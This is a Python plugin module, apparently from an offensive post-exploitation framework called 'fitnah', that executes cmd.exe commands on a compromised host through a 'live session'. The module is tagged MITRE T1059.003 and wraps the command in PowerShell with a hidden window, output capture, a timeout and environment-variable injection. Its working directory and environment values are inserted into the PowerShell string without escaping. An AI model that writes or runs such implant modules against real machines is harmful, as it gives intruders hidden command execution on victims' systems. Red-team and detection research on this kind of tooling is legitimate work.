"""execution/shell_exec — cmd.exe with output capture, timeout, cwd, env injection. MITRE T1059.003"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class ShellExec(BasePlugin):
    NAME        = "shell_exec"
    DESCRIPTION = "Execute cmd.exe command with output capture, optional timeout, cwd, and env var injection."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1059.003"
    CATEGORY    = "execution"
    schema      = ParamSchema().add(
        Param("cmd",     str, required=True,  help="Command to execute"),
        Param("cwd",     str, required=False, default="", help="Working directory (optional)"),
        Param("timeout", int, required=False, default=30, help="Timeout seconds (default 30)"),
        Param("env",     str, required=False, default="",
              help="Extra env vars as KEY=VALUE;KEY2=VALUE2 pairs"),
    )

    @mitre("T1059.003")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        cmd     = params["cmd"]
        cwd     = params.get("cwd", "").strip()
        timeout = params.get("timeout", 30)
        env_str = params.get("env", "").strip()

        env_block = ""
        if env_str:
            pairs = [p.strip() for p in env_str.split(";") if "=" in p]
            for pair in pairs:
                k, _, v = pair.partition("=")
                env_block += f'$env:{k.strip()} = "{v.strip()}"; '

        cwd_block = f'Set-Location "{cwd}"; ' if cwd else ""

        ps = (
            env_block
            + cwd_block
            + "$psi = New-Object System.Diagnostics.ProcessStartInfo;"
            + "$psi.FileName = 'cmd.exe';"
            + f"$psi.Arguments = '/c {cmd.replace(chr(39), chr(39)*2)}';"
            + "$psi.RedirectStandardOutput = $true;"
            + "$psi.RedirectStandardError  = $true;"
            + "$psi.UseShellExecute = $false;"
            + "$psi.CreateNoWindow  = $true;"
            + (f"$psi.WorkingDirectory = '{cwd}';" if cwd else "")
            + "$p = [System.Diagnostics.Process]::Start($psi);"
            + f"$done = $p.WaitForExit({timeout * 1000});"
            + "$out = $p.StandardOutput.ReadToEnd();"
            + "$err = $p.StandardError.ReadToEnd();"
            + "if (-not $done) { $p.Kill(); '[!] Timeout'; return };"
            + "\"[ExitCode: $($p.ExitCode)]\";"
            + "if ($out) { $out };"
            + "if ($err) { \"[STDERR]`n$err\" }"
        )
        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"])
